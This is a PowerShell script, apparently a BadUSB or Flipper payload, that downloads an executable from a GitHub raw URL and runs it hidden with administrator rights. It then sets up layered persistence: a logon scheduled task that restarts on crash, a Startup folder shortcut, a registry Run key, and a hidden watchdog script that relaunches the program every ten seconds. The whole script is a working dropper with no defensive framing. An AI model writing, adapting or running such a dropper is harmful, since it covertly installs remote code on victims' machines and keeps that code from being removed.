# Variables
$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe"
$exePath = "$env:APPDATA\WinUman.exe"
$shortcutName = "WinUman.lnk"
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$shortcutName"
$watchdogScriptPath = "$env:APPDATA\WinUmanWatchdog.ps1"
$scheduledTaskName = "WinUmanResilient"
$watchdogTaskName = "WinUmanWatchdog"

# --- 1. Download EXE ---
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing

# --- 2. Run EXE hidden with admin ---
Start-Process -FilePath $exePath -Verb RunAs -WindowStyle Hidden

# --- 3. Create Scheduled Task with Restart Settings ---

# Create the scheduled task action
$action = New-ScheduledTaskAction -Execute $exePath

# Trigger at logon
$trigger = New-ScheduledTaskTrigger -AtLogOn

# Settings: Restart up to 5 times if it crashes, 1 min interval, allow start on battery, don't stop on battery
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable

# Run as current user with highest privileges
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest

# Define and register the task
$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Principal $principal
Register-ScheduledTask -TaskName $scheduledTaskName -InputObject $task -Force

# --- 4. Create Startup Folder Shortcut as fallback ---
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $exePath
$shortcut.WorkingDirectory = Split-Path $exePath
$shortcut.WindowStyle = 7 # Minimized window
$shortcut.Description = "WinUman Startup Shortcut"
$shortcut.Save()

# --- 5. Add Registry Run key fallback ---
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUman" -Value $exePath

# --- 6. Create Watchdog Script ---
$watchdogScript = @"
while (\$true) {
    if (-not (Get-Process -Name 'WinUman' -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath '$exePath' -WindowStyle Hidden
    }
    Start-Sleep -Seconds 10
}
"@

# Save watchdog script to disk
Set-Content -Path $watchdogScriptPath -Value $watchdogScript -Encoding UTF8

# --- 7. Create Scheduled Task for Watchdog ---
$watchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchdogScriptPath`""
$watchdogTrigger = New-ScheduledTaskTrigger -AtLogOn
$watchdogSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$watchdogPrincipal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
$watchdogTask = New-ScheduledTask -Action $watchdogAction -Trigger $watchdogTrigger -Settings $watchdogSettings -Principal $watchdogPrincipal
Register-ScheduledTask -TaskName $watchdogTaskName -InputObject $watchdogTask -Force

Write-Host "Installation and persistence setup complete."
